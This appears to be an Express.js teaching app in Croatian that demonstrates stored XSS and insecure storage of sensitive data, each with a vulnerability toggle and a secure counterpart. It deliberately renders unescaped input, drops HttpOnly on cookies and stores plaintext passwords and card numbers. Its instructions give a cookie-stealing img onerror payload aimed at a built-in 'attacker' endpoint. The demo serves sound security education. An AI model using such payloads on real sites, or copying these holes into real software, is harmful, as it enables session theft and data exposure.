const express = require("express");
const cookieParser = require("cookie-parser");
const { randomBytes, scryptSync, timingSafeEqual, createCipheriv } = require("crypto");

const app = express();
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

const baza = { poruke: [], korisnici: [], ukradeniKolacici: [] };
const postavke = { xssRanjivost: true, sdeRanjivost: true };
const KLJUC = process.env.KLJUC ? Buffer.from(process.env.KLJUC, "hex") : randomBytes(32);
let porukaPrijave = "";

function kodiraj(tekst) {
  return String(tekst)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

app.post("/xss/poruka", (req, res) => {
  postavke.xssRanjivost = req.body.ranjivost === "on";
  if (req.body.poruka) baza.poruke.push(req.body.poruka);
  res.redirect("/");
});

app.post("/xss/obrisi", (req, res) => {
  baza.poruke = [];
  res.redirect("/");
});

app.get("/napadac", (req, res) => {
  const kolacic = req.query.cookie || "";
  baza.ukradeniKolacici.push({ vrijeme: new Date().toLocaleString("hr-HR"), kolacic });
  res.send(`<h1>Napadačev poslužitelj</h1>
<p>Primljeno: ${kodiraj(kolacic)}</p>
<form method="post" action="/xss/obrisi"><button>Obriši poruke i vrati se</button></form>`);
});

function spremiKorisnika(ime, lozinka, kartica, ranjivo) {
  if (ranjivo) {
    baza.korisnici.push({ nacin: "ranjivo", ime, lozinka, kartica });
    return;
  }
  const salt = randomBytes(16).toString("hex");
  const hash = scryptSync(lozinka, salt, 64).toString("hex");
  const iv = randomBytes(12);
  const cipher = createCipheriv("aes-256-gcm", KLJUC, iv);
  const sifrat = Buffer.concat([cipher.update(kartica, "utf8"), cipher.final()]);
  const tag = cipher.getAuthTag();
  baza.korisnici.push({
    nacin: "sigurno",
    ime,
    salt,
    hash,
    kartica: iv.toString("hex") + ":" + tag.toString("hex") + ":" + sifrat.toString("hex"),
    zadnje4: kartica.slice(-4),
  });
}

app.post("/sde/registracija", (req, res) => {
  postavke.sdeRanjivost = req.body.ranjivost === "on";
  const { ime, lozinka, kartica } = req.body;
  if (ime && lozinka && kartica) spremiKorisnika(ime, lozinka, kartica, postavke.sdeRanjivost);
  res.redirect("/");
});

app.post("/sde/prijava", (req, res) => {
  const k = baza.korisnici.find((x) => x.ime === req.body.ime);
  let ok = false;
  if (k && k.nacin === "ranjivo") ok = k.lozinka === req.body.lozinka;
  if (k && k.nacin === "sigurno") {
    const hash = scryptSync(req.body.lozinka || "", k.salt, 64);
    ok = timingSafeEqual(hash, Buffer.from(k.hash, "hex"));
  }
  porukaPrijave = ok
    ? `Prijava uspješna (${kodiraj(k.ime)}, zapis: ${k.nacin}).`
    : "Neispravno ime ili lozinka.";
  res.redirect("/");
});

app.post("/sde/obrisi", (req, res) => {
  baza.korisnici = [];
  porukaPrijave = "";
  res.redirect("/");
});

spremiKorisnika("ana", "ana123", "4539148803436467", true);
spremiKorisnika("marko", "marko123", "5425233430109903", false);

function sekcijaXss() {
  const poruke = baza.poruke
    .map((p) => `<li>${postavke.xssRanjivost ? p : kodiraj(p)}</li>`)
    .join("");
  const ukradeni = baza.ukradeniKolacici
    .map((u) => `<li>${u.vrijeme}: ${kodiraj(u.kolacic)}</li>`)
    .join("");
  return `<section>
<h2>Cross-site scripting (XSS) – pohranjeni</h2>
<p class="upute"><b>Upute:</b> Upiši poruku i spremi je. Isprobaj:<br>
<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><br>
<code>&lt;img src=x onerror="new Image().src='/napadac?cookie='+document.cookie"&gt;</code></p>
<form method="post" action="/xss/poruka">
<label><input type="checkbox" name="ranjivost" ${postavke.xssRanjivost ? "checked" : ""}> Ranjivost uključena</label><br><br>
Poruka: <input name="poruka" size="60"> <button>Spremi poruku</button>
</form>
<form method="post" action="/xss/obrisi"><button>Obriši poruke</button></form>
<h3>Poruke</h3>
<ul>${poruke}</ul>
<h3>Napadačev poslužitelj – ukradeni kolačići</h3>
<ul>${ukradeni}</ul>
</section>`;
}

function sekcijaSde() {
  const redovi = baza.korisnici
    .map((k) => `<tr>
<td>${k.nacin}</td>
<td>${kodiraj(k.ime)}</td>
<td>${k.nacin === "ranjivo" ? kodiraj(k.lozinka) : "salt=" + k.salt + "<br>hash=" + k.hash}</td>
<td>${kodiraj(k.kartica)}</td>
</tr>`)
    .join("");
  const prikaz = baza.korisnici
    .map((k) => `<li>${kodiraj(k.ime)}: ${k.nacin === "ranjivo" ? kodiraj(k.kartica) : "**** **** **** " + k.zadnje4}</li>`)
    .join("");
  return `<section>
<h2>Nesigurna pohrana osjetljivih podataka (Sensitive Data Exposure)</h2>
<p class="upute"><b>Upute:</b> Registriraj korisnika i pogledaj kako je spremljen u bazi. Testni korisnici: ana / ana123, marko / marko123.</p>
<form method="post" action="/sde/registracija">
<label><input type="checkbox" name="ranjivost" ${postavke.sdeRanjivost ? "checked" : ""}> Ranjivost uključena</label><br><br>
Ime: <input name="ime"> Lozinka: <input name="lozinka" type="password"> Kartica: <input name="kartica">
<button>Registriraj</button>
</form>
<form method="post" action="/sde/obrisi"><button>Obriši korisnike</button></form>
<h3>Sadržaj baze (ono što vidi napadač)</h3>
<table>
<tr><th>način</th><th>ime</th><th>lozinka</th><th>kartica</th></tr>
${redovi}
</table>
<h3>Prikaz korisnicima</h3>
<ul>${prikaz}</ul>
<h3>Prijava</h3>
<form method="post" action="/sde/prijava">
Ime: <input name="ime"> Lozinka: <input name="lozinka" type="password"> <button>Prijava</button>
</form>
<p>${porukaPrijave}</p>
</section>`;
}

app.get("/", (req, res) => {
  const sid = req.cookies.sessionId || randomBytes(8).toString("hex");
  res.cookie("sessionId", sid, { httpOnly: !postavke.xssRanjivost });
  res.send(`<!DOCTYPE html>
<html lang="hr">
<head>
<meta charset="utf-8">
<title>Drugi projekt</title>
<style>
body { font-family: Arial; max-width: 900px; margin: auto; padding: 16px; }
section { border-top: 1px dashed #888; margin-top: 20px; }
.upute { font-style: italic; }
code { background: #ffff66; font-style: normal; }
table { border-collapse: collapse; }
td, th { border: 1px solid #999; padding: 4px; font-size: 13px; word-break: break-all; }
form { margin: 6px 0; }
</style>
</head>
<body>
<h1>Drugi projekt</h1>
${sekcijaXss()}
${sekcijaSde()}
</body>
</html>`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server radi: http://localhost:" + PORT));